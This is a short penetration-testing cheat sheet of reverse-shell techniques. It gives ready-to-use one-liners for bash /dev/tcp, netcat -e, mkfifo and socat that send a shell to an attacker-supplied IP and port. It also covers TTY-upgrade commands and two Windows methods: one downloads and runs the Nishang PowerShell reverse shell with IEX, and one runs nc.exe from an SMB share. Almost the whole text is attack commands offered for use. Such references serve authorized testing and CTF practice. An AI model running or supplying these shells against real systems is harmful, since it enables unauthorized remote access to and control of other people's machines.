# Reverse Shells

## Interactive TTYs

> It's also possible to use `rlwrap` when starting your listening socket. (e.g. `rlwrap nc -nlvp 443`)

```bash
script /dev/null -c bash
```

or

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

and then

```bash
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
# Check size in another window: stty size
stty rows <ROWS> columns <COLUMNS>
```

## Reverse Shells

### Bash

```bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

### Ncat

```bash
nc -e /bin/bash <IP> <PORT>
```

### Mkfifo

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f
```

### Socat

```bash
socat tcp-connect:<IP>:<PORT> exec:/bin/bash,pty,stderr,setsid,sigint,sane
```

### PowerShell (Nishang)

Run this on your local machine:

```bash
curl -sL https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 -o rs.ps1
echo "Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <PORT>" >> rs.ps1
python3 -m http.server 80
```

And while running the python http server, execute this on the target:

```powershell
powershell "IEX(New-Object Net.WebClient).downloadString('http://<IP>/rs.ps1')"
```

### PowerShell (Ncat)

Locate "nc.exe" and copy it to your current directory, then run this on your local machine:

```bash
smbserver.py smbShare $(pwd) -smb2support
```

And while running the smb server, execute this on the target:

```batch
\\<IP>\smbShare\nc.exe -e cmd <IP> <PORT>
```
